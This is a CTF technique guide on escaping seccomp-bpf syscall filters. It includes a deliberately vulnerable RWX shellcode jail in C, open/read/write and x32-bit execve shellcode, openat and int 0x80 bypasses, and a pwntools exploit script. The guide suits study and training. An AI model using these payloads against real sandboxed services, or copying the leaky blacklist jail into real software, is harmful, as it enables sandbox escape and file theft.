---
title: "Seccomp Jails - ORW Shellcode and Filter Bypasses"
category: pwn
subcategory: seccomp
type: technique
tags: [seccomp, seccomp-tools, orw, openat, open, read, write, execve, execveat, shellcode, bpf, prctl, libseccomp, x32-abi, nx, mprotect, rop, pwntools, shellcraft, pwndbg]
difficulty: medium
summary: "execve is banned by a BPF filter: dump it with seccomp-tools, then open/read/write the flag - or slip past with openat, execveat or the x32 syscall bit."
when_to_use:
  - "Your shellcode gets SIGSYS / 'Bad system call' instead of a shell"
  - "seccomp-tools dump shows a filter, or the binary imports prctl / seccomp_load"
  - "checksec or strings shows libseccomp linkage, or you see a big BPF blob in .rodata"
  - "The challenge name mentions sandbox, jail, filter, or 'no shell for you'"
  - "You already have RIP control and an RWX page but execve returns -EPERM"
tools: [seccomp-tools, pwntools, strace, gdb, pwndbg, gef, checksec, objdump, nasm, one-gadget]
related: [shellcode-crafting, shellcode-ret2shellcode, shellcode-arm-mips, rop-fundamentals, rop-srop, rop-static-binary, rop-stack-pivot, mitigation-modern-playbook]
---

## TL;DR

seccomp-bpf runs a small BPF program on every syscall and can `KILL`, `ERRNO`, `TRAP` or
`ALLOW` it. CTF filters almost always ban `execve`/`execveat`, so the payload becomes ORW:
`open("/flag")`, `read(fd, buf, n)`, `write(1, buf, n)`. Dump the filter first - half the
challenge is reading the BPF and spotting what the author forgot (`openat`, `execveat`,
`sendfile`, or the `0x40000000` x32 syscall bit).

## Recognise it

- The process dies with `Bad system call` / `SIGSYS` (31) exactly when your `execve` fires;
  `dmesg` shows `audit: seccomp ... syscall=59`.
- `strings ./chal | grep -i seccomp` hits, `ldd ./chal` lists `libseccomp.so.2`, or a static
  binary carries a `struct sock_filter` table (runs of `0x15`/`0x06`/`0x20` in `.rodata`).
- `seccomp-tools dump ./chal` prints a readable filter listing.
- A shellcode jail prompt plus a `flag` file in the challenge directory: ORW is intended.

## Vulnerable source

```c
/* jail.c - RWX shellcode jail behind a libseccomp filter that bans exec+fork */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <seccomp.h>

static void install_filter(void) {
    /* Mandatory before an unprivileged process may install a filter. */
    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) < 0) { perror("no_new_privs"); exit(1); }

    /* Default-allow blacklist: the classic (and leaky) CTF pattern. */
    scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_ALLOW);
    if (!ctx) exit(1);
    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve),   0);
    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execveat), 0);
    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(fork),     0);
    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(vfork),    0);
    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(clone),    0);
    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(ptrace),   0);

    /* Whitelist variant: seccomp_init(SCMP_ACT_KILL) then SCMP_ACT_ALLOW rules for
     * read/write/open/exit_group only. Far harder to escape - no forgotten syscall. */

    if (seccomp_load(ctx) < 0) { perror("seccomp_load"); exit(1); }
    seccomp_release(ctx);
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);

    void *page = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    printf("rwx page @ %p\n", page);
    printf("shellcode: ");
    if (read(0, page, 0x400) <= 0) return 1;

    install_filter();                 /* filter goes up AFTER the read */
    ((void (*)(void))page)();
    return 0;
}
```

```sh
# libseccomp build (Debian/Ubuntu package names)
sudo apt install libseccomp-dev seccomp
gcc -m64 -no-pie -fno-stack-protector -O0 -o jail jail.c -lseccomp
echo 'flag{local_test}' > flag

# Inspect the installed filter without reading any source
seccomp-tools dump ./jail
```

## Theory

### What seccomp actually is

`prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog)` (or `seccomp(2)`) attaches a cBPF
program to the thread. Before each syscall the kernel runs it over a `struct seccomp_data`:

```c
struct seccomp_data { int nr;          /* 0  syscall number */
                      __u32 arch;      /* 4  AUDIT_ARCH_*   */
                      __u64 instruction_pointer;   /* 8  */
                      __u64 args[6]; };            /* 16 a0..a5, 8 bytes each */
```

The return value decides: `KILL_PROCESS`/`KILL_THREAD` (SIGSYS), `TRAP`, `ERRNO(n)` (the
syscall returns `-n` without running), `TRACE`, `LOG`, `ALLOW`. Filters are **inherited
across fork and preserved across execve**, and can only ever be made stricter.

### Reading a seccomp-tools dump

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x04 0xffffffff  if (A != 0xffffffff) goto 0009
 0005: 0x15 0x03 0x00 0x00000038  if (A == fork) goto 0009
 0006: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0009
 0007: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0009
 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0009: 0x06 0x00 0x00 0x00000000  return KILL
```

Things to read off it:

- **Is the arch checked?** Line 0001. Without it a 32-bit `int 0x80` syscall (a completely
  different table: `execve` is 11, not 59) sails straight past every number check.
- **Is `0x40000000` handled?** Lines 0003-0004 are libseccomp's x32 guard. Hand-written
  filters usually omit it - then `rax = 0x40000000 | nr` bypasses every `A == nr` compare.
- **Blacklist or whitelist?** A trailing `return ALLOW` means blacklist: hunt for the
  syscall the author forgot. A trailing `return KILL` means you get the listed calls only.
- **Argument constraints.** `A = args[0]` (`0x20 ... 0x00000010`) plus a compare means a
  per-argument rule, e.g. "`open` only with `O_RDONLY`" or "`mprotect` may not set `PROT_EXEC`".

### ORW: the standard payload

```
fd = open("/flag", O_RDONLY)   rax=2  rdi=path rsi=0   rdx=0
n  = read(fd, buf, 0x100)      rax=0  rdi=fd   rsi=buf rdx=0x100
     write(1, buf, n)          rax=1  rdi=1    rsi=buf rdx=n
     exit_group(0)             rax=231 rdi=0
```

```nasm
; orw.asm - open/read/write "/flag" to stdout, null-free
BITS 64
    xor  eax, eax                 ; --- open("/flag", O_RDONLY) ---
    push rax                      ; NUL terminator
    mov  rax, 0x67616c662f        ; "/flag" little-endian
    push rax
    mov  rdi, rsp                 ; rdi = "/flag"
    xor  esi, esi                 ; O_RDONLY
    xor  edx, edx                 ; mode (ignored)
    push 2
    pop  rax                      ; SYS_open = 2
    syscall
    mov  rdi, rax                 ; --- read(fd, rsp-0x200, 0x100) ---
    mov  rsi, rsp
    sub  rsi, 0x200               ; scratch below the string
    push 0x100
    pop  rdx
    xor  eax, eax                 ; SYS_read = 0
    syscall
    mov  rdx, rax                 ; --- write(1, buf, n) ---
    push 1
    pop  rdi                      ; stdout
    push 1
    pop  rax                      ; SYS_write = 1
    syscall
    push 231                      ; --- exit_group(0) ---
    pop  rax
    xor  edi, edi
    syscall
```

### open vs openat vs openat2

`open(2)` is syscall 2; glibc's `open()` wrapper has called **`openat(AT_FDCWD, ...)`**
(syscall 257) for years, and on some architectures (aarch64, riscv) `open` does not exist at
all. Filters written from glibc source ban `open` and forget `openat`, or vice versa:

```nasm
    ; openat(AT_FDCWD, "/flag", O_RDONLY) - rsp already holds the path
    mov  rdi, -100                ; AT_FDCWD (0xffffffffffffff9c - contains 0xff bytes)
    mov  rsi, rsp
    xor  edx, edx                 ; flags = O_RDONLY
    xor  r10d, r10d               ; mode
    mov  eax, 257
    syscall
```

`openat2` is 437 and takes a `struct open_how *` - almost never in a CTF blacklist.

### The x32 ABI bypass

x86-64 kernels built with `CONFIG_X86_X32_ABI` expose a second syscall table selected by
bit 30 of `rax` (`__X32_SYSCALL_BIT = 0x40000000`). For most syscalls the x32 number is the
same number with that bit set - `open` -> `0x40000002`, `read` -> `0x40000000`,
`write` -> `0x40000001` - so a filter comparing `A == 2` never matches. A handful of
syscalls needing compat handling were *renumbered*: `execve` -> `0x40000208` (520),
`execveat` -> `0x40000221` (545), plus `readv` 515, `writev` 516, `preadv` 534, `pwritev` 535.

```nasm
    ; execve("/bin/sh", NULL, NULL) through the x32 entry point
    xor  esi, esi
    push rsi
    mov  rdi, 0x68732f2f6e69622f
    push rdi
    push rsp
    pop  rdi
    xor  edx, edx
    mov  eax, 0x40000208          ; x32 execve
    syscall
```

Caveats: the kernel must actually have x32 enabled (`grep CONFIG_X86_X32 /boot/config-$(uname -r)`,
and newer kernels gate it behind the `syscall.x32=y` boot parameter), and x32 `argv`/`envp`
arrays hold **32-bit** pointers - passing `NULL` for both sidesteps that entirely.

### Other escapes worth trying

- `execveat(dirfd, "", argv, envp, AT_EMPTY_PATH)` when only `execve` is banned.
- `int 0x80` from 64-bit code: runs the **i386** table (`execve` = 11, `open` = 5). Works if
  the filter only guards `ARCH_X86_64`; arguments must be 32-bit-representable.
- `sendfile(1, fd, NULL, 0x100)` (40), `splice`, or `copy_file_range` to move the flag to
  stdout without `read`/`write`; `pread64` (17) / `preadv` (295) when only `read` is blocked.
- `mmap(0, len, PROT_READ, MAP_PRIVATE, fd, 0)` then `write` the mapping; or, if `write` is
  banned, side-channel the flag out with `exit_group(byte)`, timing, or a `stat` oracle.

## Attack

1. `seccomp-tools dump ./chal` (or `seccomp-tools dump -f raw`). Transcribe the rules.
2. Classify: blacklist vs whitelist, arch-checked or not, x32 guard present or not,
   per-argument constraints.
3. Pick the cheapest escape in this order: forgotten syscall (`openat`, `execveat`) ->
   x32 bit -> `int 0x80` -> full ORW.
4. Confirm the flag's path (`/flag`, `/flag.txt`, `./flag`); `getdents64`(217) on `"."`
   enumerates the directory if you are unsure. Test locally, then fire it.

## Exploit

```python
#!/usr/bin/env python3
"""ORW shellcode against a seccomp jail; --X32 switches to the x32 execve bypass."""
from pwn import *

context.arch = "amd64"
context.os = "linux"
FLAG = args.FLAG or "/flag"

ORW = (
    "xor eax, eax; push rax; mov rax, {word}; push rax; mov rdi, rsp; "   # open(path,
    "xor esi, esi; xor edx, edx; push 2; pop rax; syscall; "              #   O_RDONLY)
    "mov rdi, rax; mov rsi, rsp; sub rsi, 0x200; "                        # read(fd,
    "push 0x100; pop rdx; xor eax, eax; syscall; "                        #   buf, 0x100)
    "mov rdx, rax; push 1; pop rdi; push 1; pop rax; syscall; "           # write(1, buf, n)
    "push 231; pop rax; xor edi, edi; syscall"                            # exit_group(0)
)

X32_EXECVE = ("xor esi, esi; push rsi; mov rdi, 0x68732f2f6e69622f; push rdi; "
              "push rsp; pop rdi; xor edx, edx; mov eax, 0x40000208; syscall")


def orw_manual(path):
    """Hand-written ORW; path must be <= 8 bytes so it fits one push."""
    raw = path.encode()
    if len(raw) > 8:
        log.error("path too long for the single-push version: %r", path)
    return asm(ORW.format(word=hex(u64(raw.ljust(8, b"\x00")))))


def orw_shellcraft(path):
    """Same thing via pwntools shellcraft, for any path length."""
    sc = shellcraft.amd64.linux
    return asm(sc.open(path, 0, 0) + sc.read("rax", "rsp", 0x100) +
               sc.write(1, "rsp", "rax") + sc.exit(0))


def start():
    if args.REMOTE:
        return remote(args.HOST or "127.0.0.1", int(args.PORT or 1337))
    return process(["./jail"])


def main():
    if args.X32:
        payload = asm(X32_EXECVE)
    elif args.SHELLCRAFT:
        payload = orw_shellcraft(FLAG)
    else:
        payload = orw_manual(FLAG)
    log.info("payload: %d bytes\n%s", len(payload), disasm(payload))

    io = start()
    io.recvuntil(b"shellcode: ")
    io.send(payload)

    if args.X32:
        io.sendline(b"cat " + FLAG.encode())
        io.interactive()
    else:
        log.success("output: %r", io.recvall(timeout=5).strip())


if __name__ == "__main__":
    main()
```

A helper that reads the filter for you and suggests the escape:

```python
#!/usr/bin/env python3
"""Dump a binary's seccomp filter and classify it (needs seccomp-tools in PATH)."""
import re, shutil, subprocess, sys
from pwn import *


def dump(binary):
    if shutil.which("seccomp-tools") is None:
        log.error("install seccomp-tools:  gem install seccomp-tools")
    return subprocess.run(["seccomp-tools", "dump", binary],
                          capture_output=True, text=True, input="").stdout


def classify(text):
    verdict = []
    if "A = arch" not in text:
        verdict.append("no arch check -> try int 0x80 (i386 table: execve=11, open=5)")
    if "0x40000000" not in text:
        verdict.append("no x32 guard -> set bit 30 of rax (execve = 0x40000208)")

    rets = [l for l in text.splitlines() if "return" in l]
    verdict.append("blacklist -> find the forgotten syscall" if rets and "ALLOW" in rets[-1]
                   else "whitelist -> build the payload from the allowed set only")

    banned = sorted(set(re.findall(r"if \(A == (\w+)\)", text)))
    if banned:
        verdict.append("named in the filter: " + ", ".join(banned))
    for alt, orig in (("openat", "open"), ("execveat", "execve"),
                      ("sendfile", "write"), ("pread64", "read")):
        if orig in banned and alt not in banned:
            verdict.append("%s banned but %s is not" % (orig, alt))
    return verdict


def main():
    text = dump(sys.argv[1] if len(sys.argv) > 1 else "./jail")
    print(text)
    for verdict in classify(text):
        log.success(verdict)


if __name__ == "__main__":
    main()
```

## Variants & pitfalls

- **ROP instead of shellcode.** With NX on you build the same ORW sequence as a ROP chain
  (`pop rdi/rsi/rdx/rax; syscall`) - see `rop-static-binary`. `SROP` (`rop-srop`) is ideal
  here because one `sigreturn` frame sets all six argument registers plus `rax` at once.
- **`SCMP_ACT_ERRNO` instead of `KILL`** returns `-EPERM` silently, so your shellcode walks
  off into garbage instead of dying loudly - check `rax` as you go.
- **x32 is often unavailable.** Modern distro kernels increasingly ship it disabled. Test
  locally with a tiny program before building the whole exploit on it.
- **Per-thread filters.** seccomp applies to the calling thread and its children; a helper
  thread spawned before the filter goes up stays unfiltered.
- **Argument checks on 64-bit values** compile to two 32-bit compares (`args[n]` low and
  high), so a register with stale upper bits fails a rule you thought you satisfied.
- **Buffer placement.** Reading into `rsp` clobbers your own shellcode when page and stack
  overlap; use `rsp - 0x200` or the RWX page tail.
- **Don't forget `exit_group`.** Without it, execution runs off the end of the page and the
  process dies before `write` output is flushed on some setups.

## Tools

```sh
gem install seccomp-tools && pip install pwntools

# Dump a filter, three ways
seccomp-tools dump ./jail
seccomp-tools dump -f raw ./jail > filter.bpf && seccomp-tools disasm filter.bpf

# Emulate the filter against a syscall; check a live process
seccomp-tools emu filter.bpf execve
grep Seccomp /proc/<pid>/status          # 2 == SECCOMP_MODE_FILTER

# Which syscalls does the binary even reference?
objdump -d ./jail | grep -B4 syscall | head -60

# Syscall numbers and kernel x32 support
ausyscall --dump | grep -E '\b(open|openat|execve|execveat|sendfile|pread)\b'
grep CONFIG_X86_X32 /boot/config-$(uname -r)
```
